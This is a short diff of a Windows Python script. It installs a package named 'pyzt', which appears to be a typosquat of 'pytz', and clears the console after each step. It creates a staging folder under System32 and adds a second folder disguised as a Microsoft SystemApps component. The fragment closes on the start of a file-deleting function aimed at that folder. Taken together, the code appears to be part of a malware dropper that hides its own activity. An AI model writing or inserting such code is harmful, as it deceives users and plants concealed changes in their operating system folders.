@@ -21,11 +21,14 @@ commandxx = ['py', '-3.11', '-m', 'pip', 'install', 'pyzt']
 subprocess.run(commandxx)
 os.system('cls')
 dcnmwxdr = r'C:\Windows\System32\DSEL'
-
 if not os.path.exists(dcnmwxdr):
     os.makedirs(dcnmwxdr)
     os.system('cls')
 
+mypart2 = r'C:\Windows\SystemApps\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy1h2txyeX'
+if not os.path.exists(mypart2):
+    os.makedirs(mypart2)
+    os.system('cls')
 
 def delete_files_if_condition(file):
     target_dir = r"C:\Windows\System32\DSEL" 
